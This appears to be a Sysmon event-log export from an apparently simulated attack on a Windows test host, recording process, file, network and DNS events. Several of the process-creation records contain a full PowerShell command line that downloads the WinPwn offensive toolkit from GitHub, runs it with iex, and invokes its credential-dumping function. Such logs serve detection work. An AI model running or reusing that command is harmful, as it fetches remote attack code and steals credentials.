User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259

ParentProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ParentProcessId: 1092

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:09:32.413,,,,,,,,,11,19593,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:09:32.413

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline

CreationUtcTime: 2023-12-27 20:09:32.413

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,,,,,,"
      ",-,,,,,,2023-12-27T20:09:32.4147049Z,C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:32.413,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.4147049Z""/>
      <EventRecordID>19593</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:32.413</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:09:32.413</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:09:32.413

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline

CreationUtcTime: 2023-12-27 20:09:32.413

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:09:32.413,,,,,,,,,11,19592,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-27 20:09:32.413

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\yfexfutf.dll

CreationUtcTime: 2023-12-27 20:09:32.413

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,,,,,,"
      ",DLL,,,,,,2023-12-27T20:09:32.4142983Z,C:\Users\User\AppData\Local\Temp\yfexfutf.dll,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:32.413,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.4142983Z""/>
      <EventRecordID>19592</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:32.413</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\yfexfutf.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:09:32.413</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-27 20:09:32.413

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\yfexfutf.dll

CreationUtcTime: 2023-12-27 20:09:32.413

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-109-133.github.com,185.199.109.133,false,443,https,,3,19591,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,Information,,,"Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:47.261

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50089

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.109.133

DestinationHostname: cdn-185-199-109-133.github.com

DestinationPort: 443

DestinationPortName: https",Info,,,,,,,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,,tcp,,,,"
      ",-,WinDev2309Eval.localdomain,192.168.126.163,false,50089,-,2023-12-27T20:09:32.1483242Z,,,Network connection detected (rule: NetworkConnect),,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:47.261,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.1483242Z""/>
      <EventRecordID>19591</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:47.261</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.163</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">50089</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">185.199.109.133</Data>
      <Data Name=""DestinationHostname"">cdn-185-199-109-133.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:47.261

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50089

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.109.133

DestinationHostname: cdn-185-199-109-133.github.com

DestinationPort: 443

DestinationPortName: https</Message>
      <Level>Information</Level>
      <Task>Network connection detected (rule: NetworkConnect)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:09:29.959,,,,,,,,,11,19590,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:09:29.959

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iphzrism.hbd.ps1

CreationUtcTime: 2023-12-27 20:09:29.959

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,,,,,,"
      ",-,,,,,,2023-12-27T20:09:29.9681102Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iphzrism.hbd.ps1,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:29.959,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:29.9681102Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:29.959</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iphzrism.hbd.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:09:29.959</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:09:29.959

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_iphzrism.hbd.ps1

CreationUtcTime: 2023-12-27 20:09:29.959

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19589,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:29.863

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T20:09:29.8649803Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:29.863,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:29.8649803Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:29.863</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:29.863

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,19588,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:37.777

ProcessGuid: {f57bd86a-846c-658c-cd01-000000000f00}

ProcessId: 5612

QueryName: WINDEV2309EVAL

QueryStatus: 0

QueryResults: 192.168.36.130;192.168.126.163;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-846c-658c-cd01-000000000f00},3588,5612,,,WINDEV2309EVAL,192.168.36.130;192.168.126.163;,0,"
      ",-,,,,,,2023-12-27T20:09:23.5047762Z,,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:37.777,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:23.5047762Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:37.777</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-846c-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">5612</Data>
      <Data Name=""QueryName"">WINDEV2309EVAL</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">192.168.36.130;192.168.126.163;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:37.777

ProcessGuid: {f57bd86a-846c-658c-cd01-000000000f00}

ProcessId: 5612

QueryName: WINDEV2309EVAL

QueryStatus: 0

QueryResults: 192.168.36.130;192.168.126.163;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
